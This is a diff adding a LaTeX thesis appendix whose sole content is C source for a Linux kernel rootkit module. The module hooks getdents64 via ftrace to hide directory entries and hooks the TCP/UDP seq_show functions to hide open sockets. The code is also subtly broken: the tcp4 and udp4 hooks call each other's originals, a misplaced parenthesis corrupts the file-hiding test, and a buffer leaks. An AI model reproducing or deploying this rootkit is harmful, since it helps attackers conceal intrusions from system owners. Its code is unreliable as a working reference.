@@ -1,0 +1,214 @@
+\chapter*{\hfill{}ПРИЛОЖЕНИЕ А\hfill{}}%
+\label{cha:appendix1}
+\addcontentsline{toc}{chapter}{ПРИЛОЖЕНИЕ А}
+\section*{\hfill{}РЕАЛИЗАЦИЯ\hfill{}}%
+\label{sec:realizatsiia}
+% \addcontentsline{toc}{section}{РЕАЛИЗАЦИЯ}
+
+\begin{lstlisting}[language=c,caption={Код программы}, label=lst:defsh]
+#include "ftrace_helper.h"
+#include <linux/dirent.h>
+#include <linux/init.h>
+#include <linux/kallsyms.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/syscalls.h>
+#include <linux/tcp.h>
+#include <net/sock.h>
+
+#define CURRENT_DIR "."
+#define PARENT_DIR ".."
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Ahmad Khalid Karimzai");
+MODULE_DESCRIPTION("directories and files and open ports of tcp/v4 tcp/v6");
+
+static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq,
+												void *v);
+static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq,
+												void *v);
+static asmlinkage long (*orig_udp6_seq_show)(struct seq_file *seq,
+												void *v);
+static asmlinkage long (*orig_udp4_seq_show)(struct seq_file *seq,
+												void *v);
+static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
+
+static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+	struct inet_sock	*is;
+	struct sock			*sk;
+	long				ret;
+
+	if (v != SEQ_START_TOKEN)
+	{
+		is = (struct inet_sock *)v;
+		sk = (struct sock *)&is->sk;
+		printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
+				ntohs(is->inet_sport),
+				ntohs(is->inet_dport));
+			return (0);
+	}
+	ret = orig_udp4_seq_show(seq, v);
+	return (ret);
+}
+
+static asmlinkage long hook_udp6_seq_show(struct seq_file *seq, void *v)
+{
+	struct inet_sock	*is;
+	struct sock			*sk;
+	long				ret;
+
+	if (v != SEQ_START_TOKEN)
+	{
+		is = (struct inet_sock *)v;
+		sk = (struct sock *)&is->sk;
+		printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
+				ntohs(is->inet_sport),
+				ntohs(is->inet_dport));
+			return (0);
+	}
+	ret = orig_udp6_seq_show(seq, v);
+	return (ret);
+}
+
+static asmlinkage long hook_udp4_seq_show(struct seq_file *seq, void *v)
+{
+	struct inet_sock	*is;
+	struct sock			*sk;
+	long				ret;
+
+	if (v != SEQ_START_TOKEN)
+	{
+		is = (struct inet_sock *)v;
+		sk = (struct sock *)&is->sk;
+		printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
+				ntohs(is->inet_sport),
+				ntohs(is->inet_dport));
+			return (0);
+	}
+	ret = orig_tcp4_seq_show(seq, v);
+	return (ret);
+}
+
+static asmlinkage long	hook_tcp6_seq_show(struct seq_file *seq, void *v)
+{
+	struct inet_sock	*is;
+	struct sock			*sk;
+	long				ret;
+
+	if (v != SEQ_START_TOKEN)
+	{
+		is = (struct inet_sock *)v;
+		sk = (struct sock *)&is->sk;
+		printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
+				ntohs(is->inet_sport),
+				ntohs(is->inet_dport));
+		return (0);
+	}
+	ret = orig_tcp6_seq_show(seq, v);
+	return (ret);
+}
+
+asmlinkage int	hacked_getdents64(const struct pt_regs *regs)
+{
+	long			error;
+	unsigned long	offset;
+	int				ret;
+
+	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
+
+	struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
+	offset = 0;
+
+
+	ret = orig_getdents64(regs);
+	dirent_ker = kzalloc(ret, GFP_KERNEL);
+	if ((ret <= 0) || (dirent_ker == NULL))
+		return (ret);
+
+
+	error = copy_from_user(dirent_ker, dirent, ret);
+	if (error == 0)
+	{
+		while (offset < ret)
+		{
+			current_dir = (void *)dirent_ker + offset;
+			if (memcmp(current_dir->d_name, CURRENT_DIR,
+					strlen(CURRENT_DIR)) != 0 ||
+				memcmp(current_dir->d_name, PARENT_DIR,
+						strlen(PARENT_DIR) != 0))
+			{
+				if (current_dir == dirent_ker)
+				{
+					ret -= current_dir->d_reclen;
+					memmove(current_dir, (void *)current_dir
+							+ current_dir->d_reclen, ret);
+
+					continue ;
+				}
+				previous_dir->d_reclen += current_dir->d_reclen;
+			}
+			else
+			{
+				previous_dir = current_dir;
+			}
+			offset += current_dir->d_reclen;
+		}
+		error = copy_to_user(dirent, dirent_ker, ret);
+	}
+	if (error != 0)
+	{
+		kfree(dirent_ker);
+	}
+	return (ret);
+}
+
+static struct ftrace_hook	hooks[] = {
+	{
+		.name = ("udp4_seq_show"),
+		.function = (hook_udp4_seq_show),
+		.original = &(orig_udp4_seq_show)
+	},
+	{
+		.name = ("udp6_seq_show"),
+		.function = (hook_udp6_seq_show),
+		.original = &(orig_udp6_seq_show)
+	},
+	{
+		.name = ("tcp4_seq_show"),
+		.function = (hook_tcp4_seq_show),
+		.original = &(orig_tcp4_seq_show),
+	},
+	{
+		.name = ("tcp6_seq_show"),
+		.function = (hook_tcp6_seq_show),
+		.original = &(orig_tcp6_seq_show),
+	},
+	{
+		.name = ("__x64_sys_getdents64"),
+		.function = (hacked_getdents64),
+		.original = &(orig_getdents64),
+	},
+};
+
+static int __init	rootkit_init(void)
+{
+	int	err;
+
+	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+	if (err)
+		return (err);
+	printk(KERN_INFO "rootkit: Loaded >:-)\n");
+	return (0);
+}
+
+static void __exit	rootkit_exit(void)
+{
+	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+	printk(KERN_INFO "rootkit: Unloaded :-(\n");
+}
+
+module_init(rootkit_init);
+module_exit(rootkit_exit);
+	
+	\end{lstlisting}
